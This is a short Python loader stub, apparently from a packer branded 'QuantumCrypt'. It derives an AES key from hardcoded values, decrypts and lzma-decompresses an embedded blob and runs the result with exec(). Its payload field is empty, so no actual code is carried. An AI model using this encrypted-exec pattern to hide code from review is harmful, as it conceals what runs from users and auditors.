import sys, lzma, base64, hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

_S = "NjhkMjdhMWYxN2UxOWMxM2M2ODViZGRiZjllODczOTA="
_I = "vltFYi88eNXhC7DniZTA6Q=="
_D = ""
_B = "QuantumCrypt"

def _k():
    return hashlib.sha256((_B + base64.b64decode(_S).decode()).encode()).digest()

def _r():
    try:
        key = _k()
        iv = base64.b64decode(_I)
        data = base64.b64decode(_D)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        dec = unpad(cipher.decrypt(data), AES.block_size)
        code = lzma.decompress(dec).decode()
        # EKSEKUSI DENGAN GLOBALS YANG BENAR
        exec(code, globals())
    except Exception as e:
        print(f"❌ Gagal memuat skrip: {e}")
        sys.exit(1)

if __name__ == "__main__":
    _r()
